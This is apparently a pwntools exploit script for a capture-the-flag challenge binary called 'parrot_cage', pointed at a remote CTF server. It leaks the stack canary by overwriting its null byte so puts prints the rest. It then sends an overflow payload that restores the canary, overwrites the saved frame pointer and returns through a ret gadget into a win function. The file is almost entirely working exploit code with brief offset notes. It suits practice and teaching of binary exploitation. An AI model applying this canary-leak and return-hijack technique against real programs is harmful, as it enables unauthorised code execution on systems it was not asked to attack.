from pwn import *

elf = context.binary = ELF('./parrot_cage', checksec=False)

#p = process(elf.path)
p = remote("offsec.m0lecon.it", 13599)
#export FLAG="test{flag_finta}"

# with p $rbp, i've found 0x7fffffffdb70. this means that RIP is at position 0x7fffffffdb78
# looking inside gdb, and sending A one iteration at a time, we can see that 0x7fffffffdb20 address is probabli the start of the buffer.

# addresses of interesting pieces of code
win_addr = 0x401236
ret_gadget = 0x40101a

# those addresses are not beeing used
buf_rbp_dist = 0x7fffffffdb70 - 0x7fffffffdb20
buf_rip_dist = 0x7fffffffdb78 - 0x7fffffffdb20
BUF_SIZE = 64

print(f'buf rbp: {hex(buf_rbp_dist)}. buf rip: {hex(buf_rip_dist)}')

# sending 73 A. because, we have to fill the buffer until the canary, +1 A to replace the 0x00 last byte of the canary. this is needed because puts will print everything until a \0 is found, so
# we have to delete the 0 from the canary. doing so will assure to receive 73A + the 7 remaining bytes of the canary + garbage until a \0 is found in memory
payload = b'A' * 73#(BUF_SIZE + 1)

p.recvuntil(b'chatting.')

p.send(payload)

p.recvuntil(b'A' * 73)
# we are interested only in the remaining 7 bytes of the canary
leak = p.recv(7)
canary = u64(b'\x00' + leak)

# final payload to force the win execution
payload = b"bye\x00"
payload += b"A" * (72 - len(payload)) # Padding till the canary (48+16+8)
payload += p64(canary)
payload += b"B" * 8                   # override of RBP
payload += p64(ret_gadget)             # stack allignment
payload += p64(win_addr)

#print(payload)
p.send(payload)
p.interactive()